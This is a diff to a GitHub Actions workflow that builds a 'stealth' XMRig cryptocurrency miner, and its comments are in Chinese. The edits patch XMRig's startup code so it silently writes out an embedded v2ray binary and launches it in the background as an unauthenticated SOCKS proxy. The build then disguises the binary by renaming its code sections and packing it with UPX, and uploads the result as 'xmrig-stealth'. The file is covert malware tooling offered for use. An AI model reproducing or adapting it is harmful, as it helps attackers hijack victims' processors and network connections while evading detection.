@@ -1,4 +1,4 @@
-name: Fixed XMRig Stealth Build
+name: XMRig-v2ray Stealth Build
 
 on:
   workflow_dispatch:
@@ -8,9 +8,10 @@ on:
 jobs:
   stealth-build:
     runs-on: ubuntu-latest
-    timeout-minutes: 25
+    timeout-minutes: 30
 
     steps:
+    # 阶段 1：克隆源代码
     - name: Clone XMRig
       uses: actions/checkout@v4
       with:
@@ -23,48 +24,77 @@ jobs:
         repository: v2fly/v2ray-core
         path: src/v2ray
 
-    - name: Setup Build Tools
+    # 阶段 2：环境配置
+    - name: Setup Build Environment
       run: |
         sudo apt-get update
         sudo apt-get install -y \
           build-essential cmake libuv1-dev libssl-dev libhwloc-dev \
-          golang upx-ucl xxd
+          golang upx-ucl xxd python3-pip
+        pip install pefile
 
-    - name: Build v2ray Proxy
+    # 阶段 3：构建v2ray代理核心
+    - name: Build v2ray Binary
       working-directory: src/v2ray
       run: |
         CGO_ENABLED=0 go build -ldflags "-s -w -buildid=" -trimpath -o v2ray ./main
 
-    - name: Generate v2ray Header
+    # 阶段 4：代码融合
+    - name: Embed v2ray into XMRig
       run: |
+        # 将v2ray二进制转换为C头文件
         xxd -i src/v2ray/v2ray > src/xmrig/src/v2ray_embed.h
 
-    - name: Patch XMRig Source
-      working-directory: src/xmrig
-      run: |
-        # 使用临时文件避免sed语法问题
-        cat << 'EOF' > patch_app.cpp
-        #include "v2ray_embed.h"
-        
-        void StartProxy() {
-            FILE* f = fopen("v2ray", "wb");
-            fwrite(v2ray, 1, v2ray_len, f);
-            fclose(f);
-            chmod("v2ray", 0700);
-            system("./v2ray -config=config.json >/dev/null 2>&1 &");
+        # 创建自动代理配置文件
+        cat << EOF > src/xmrig/v2ray_config.json
+        {
+          "inbounds": [{
+            "port": 1080,
+            "protocol": "socks",
+            "settings": {
+              "auth": "noauth",
+              "udp": true
+            }
+          }],
+          "outbounds": [{
+            "protocol": "freedom",
+            "settings": {}
+          }]
         }
         EOF
 
-        # 将补丁插入到App.cpp中
-        sed -i '/#include "base\/kernel\/Platform.h"/r patch_app.cpp' src/App.cpp
-        
-        # 在Platform.cpp添加启动调用
-        sed -i '/Platform::init(/a \ \ \ \ StartProxy();' src/base/kernel/Platform.cpp
-        
-        # 清理临时文件
-        rm patch_app.cpp
+    # 阶段 5：修改XMRig源代码
+    - name: Patch XMRig Source Code
+      working-directory: src/xmrig
+      run: |
+        # 在App.h中添加函数声明
+        sed -i '/namespace xmrig {/a \    void StartProxy();' src/App.h
 
-    - name: Build XMRig
+        # 在App.cpp中添加函数实现
+        cat << 'EOF' >> src/App.cpp
+        #include "v2ray_embed.h"
+        #include <cstdio>
+        #include <cstdlib>
+        
+        void xmrig::StartProxy() {
+            FILE* f = fopen("v2ray", "wb");
+            if (f) {
+                fwrite(v2ray, 1, v2ray_len, f);
+                fclose(f);
+                chmod("v2ray", 0700);
+                system("./v2ray run -config=v2ray_config.json >/dev/null 2>&1 &");
+            }
+        }
+        EOF
+
+        # 在Platform.cpp注入启动调用
+        sed -i '/void Platform::init(/a \ \ \ \ StartProxy();' src/base/kernel/Platform.cpp
+
+        # 修改CMakeLists.txt包含新头文件
+        sed -i '/set(HEADERS/ a \ \ \ \ src/v2ray_embed.h' CMakeLists.txt
+
+    # 阶段 6：混淆编译
+    - name: Build Obfuscated XMRig
       working-directory: src/xmrig
       run: |
         mkdir -p build
@@ -74,16 +104,20 @@ jobs:
           -DWITH_OPENCL=OFF \
           -DWITH_CUDA=OFF \
           -DCMAKE_BUILD_TYPE=Release \
-          -DCMAKE_C_FLAGS="-flto -fomit-frame-pointer" \
-          -DCMAKE_CXX_FLAGS="-flto -fomit-frame-pointer"
+          -DCMAKE_CXX_FLAGS="-flto -fomit-frame-pointer -march=native"
+        
         make -j$(nproc)
 
+        # 二进制混淆处理
         objcopy --rename-section .text=.cryptext \
                 --rename-section .data=.cryptdata \
                 xmrig
+
+        # 高级压缩
         upx --ultra-brute --lzma xmrig -o xmrig_stealth
 
-    - name: Upload Artifact
+    # 阶段 7：发布结果
+    - name: Upload Stealth Binary
       uses: actions/upload-artifact@v4
       with:
         name: xmrig-stealth
